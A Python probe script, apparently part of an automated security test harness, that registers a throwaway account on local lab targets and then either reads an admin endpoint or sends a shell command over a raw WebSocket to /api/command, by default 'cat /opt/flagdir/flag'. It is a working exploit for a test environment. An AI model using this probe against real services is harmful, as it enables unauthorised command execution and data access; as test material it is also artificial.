#!/usr/bin/env python3
"""Method-side executable probe: run a candidate dict against the target.
Usage: python3 seed_exec.py <candidate.json> [version]
"""
import sys, json, urllib.request, urllib.parse, time, subprocess
BASE = {
    "v0": "http://127.0.0.1:39360",
    "v1": "http://127.0.0.1:39361",
}
import argparse
import base64
import json
import os
import secrets
import socket
import ssl
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path
BASE = {
    "v0": "http://127.0.0.1:39360",
    "v1": "http://127.0.0.1:39361",
}
def run_probe(candidate, *, version="v1"):
    
    base = BASE[version]
    cand = candidate if isinstance(candidate, dict) else {"channel": "exec", "command": str(candidate)}
    channel = cand.get("channel", "exec")

    user = "poc_" + secrets.token_hex(6)
    pw = secrets.token_hex(8)

    signup_status, _ = _req("POST", f"{base}/api/signup", body={"username": user, "password": pw})
    login_status, login_body = _req("POST", f"{base}/api/login", body={"username": user, "password": pw})
    
    token = login_body.strip() if isinstance(login_body, str) and login_body.count(".") == 2 else None

    if channel == "admin":
        endpoint = cand.get("endpoint", "/api/users")
        read_status, read_body = _req("GET", f"{base}{endpoint}", token=token)
    else:  
        read_status, read_body = _ws_command(
            base, cand.get("endpoint", "/api/command"), token or "", cand.get("command", "cat /opt/flagdir/flag")
        )

    return {
        "version": version,
        "probe_id": cand.get("probe_id"),
        "channel": channel,
        "signup_status": signup_status,
        "login_status": login_status,
        "read_status": read_status,
        "read_body": read_body,
    }
def _req(method: str, url: str, *, body=None, token=None, timeout=15):
    
    data = None
    headers = {}
    if body is not None:
        if isinstance(body, (dict, list)):
            data = json.dumps(body).encode()
            headers["Content-Type"] = "application/json"
        else:
            data = str(body).encode()
            headers["Content-Type"] = "text/plain"
    if token:
        headers["X-Auth"] = token
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.getcode(), r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:  
        return None, f"<req-error: {e}>"
def _ws_command(base: str, path: str, token: str, command: str, timeout=15):
    
    u = urllib.parse.urlparse(base)
    host, port = u.hostname, u.port or 80
    key = base64.b64encode(secrets.token_bytes(16)).decode()
    try:
        s = socket.create_connection((host, port), timeout=timeout)
    except Exception as e:  
        return None, f"<ws-connect-error: {e}>"
    s.settimeout(timeout)
    try:
        if u.scheme == "https":
            s = ssl.create_default_context().wrap_socket(s, server_hostname=host)
        handshake = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {host}:{port}\r\n"
            "Upgrade: websocket\r\n"
            "Connection: Upgrade\r\n"
            f"Sec-WebSocket-Key: {key}\r\n"
            "Sec-WebSocket-Version: 13\r\n"
            f"Cookie: auth={token}\r\n"
            "\r\n"
        )
        s.sendall(handshake.encode())

        
        buf = b""
        while b"\r\n\r\n" not in buf:
            chunk = s.recv(4096)
            if not chunk:
                break
            buf += chunk
        head, _, rest = buf.partition(b"\r\n\r\n")
        status_line = head.split(b"\r\n", 1)[0].decode("latin-1", "replace")
        try:
            ws_status = int(status_line.split()[1])
        except Exception:  
            ws_status = None
        if ws_status != 101:
            return ws_status, f"<ws-handshake-failed: {status_line}>"

        
        payload = command.encode()
        mask = secrets.token_bytes(4)
        masked = bytes(b ^ mask[i % 4] for i, b in enumerate(payload))
        frame = bytearray([0x81])  
        ln = len(payload)
        if ln < 126:
            frame.append(0x80 | ln)
        elif ln < (1 << 16):
            frame.append(0x80 | 126)
            frame += ln.to_bytes(2, "big")
        else:
            frame.append(0x80 | 127)
            frame += ln.to_bytes(8, "big")
        frame += mask + masked
        s.sendall(frame)

        
        stream = bytearray(rest)  

        def _pull(n: int) -> bytes:
            nonlocal stream
            while len(stream) < n:
                c = s.recv(4096)
                if not c:
                    break
                stream += c
            chunk = bytes(stream[:n])
            del stream[:n]
            return chunk

        out_text = []
        while True:
            hdr = _pull(2)
            if len(hdr) < 2:
                break
            b0, b1 = hdr[0], hdr[1]
            opcode = b0 & 0x0F
            masked_bit = b1 & 0x80
            ln = b1 & 0x7F
            if ln == 126:
                ln = int.from_bytes(_pull(2), "big")
            elif ln == 127:
                ln = int.from_bytes(_pull(8), "big")
            mk = _pull(4) if masked_bit else b""
            data = _pull(ln) if ln else b""
            if mk:
                data = bytes(d ^ mk[i % 4] for i, d in enumerate(data))
            if opcode == 0x8:  
                break
            if opcode in (0x1, 0x2):  
                out_text.append(data.decode("utf-8", "replace"))
            
        return 101, "".join(out_text)
    except Exception as e:  
        return None, f"<ws-error: {e}>"
    finally:
        try:
            s.close()
        except Exception:  
            pass


import os as _os_pcb
_pbt = _os_pcb.environ.get("PCB_TARGET_BASE")
if _pbt:
    for _d in ("BASE", "HOSTPORT", "PORTS"):
        if _d in globals() and isinstance(globals()[_d], dict):
            for _v in list(globals()[_d]):
                globals()[_d][_v] = _pbt
_pt = _os_pcb.environ.get("PCB_TARGET_PORT")
if _pt:
    if "BASE" in globals() and isinstance(globals()["BASE"], dict):
        for _v in list(globals()["BASE"]):
            _val = globals()["BASE"][_v]
            if isinstance(_val, (tuple, list)):
                globals()["BASE"][_v] = (str(_val[0]), int(_pt))
            elif isinstance(_val, int) or (isinstance(_val, str) and _val.isdigit()):
                globals()["BASE"][_v] = int(_pt)
            else:
                globals()["BASE"][_v] = f"http://127.0.0.1:{int(_pt)}"
    for _d in ("HOSTPORT", "PORTS"):
        if _d in globals() and isinstance(globals()[_d], dict):
            for _v in list(globals()[_d]):
                _old = globals()[_d][_v]
                if isinstance(_old, (tuple, list)):
                    globals()[_d][_v] = (str(_old[0]), int(_pt))
                else:
                    globals()[_d][_v] = int(_pt)

if __name__ == "__main__":
    cand = json.load(open(sys.argv[1]))
    version = sys.argv[2] if len(sys.argv) > 2 else "v1"
    r = run_probe(cand, version=version)
    print(json.dumps(r, default=str))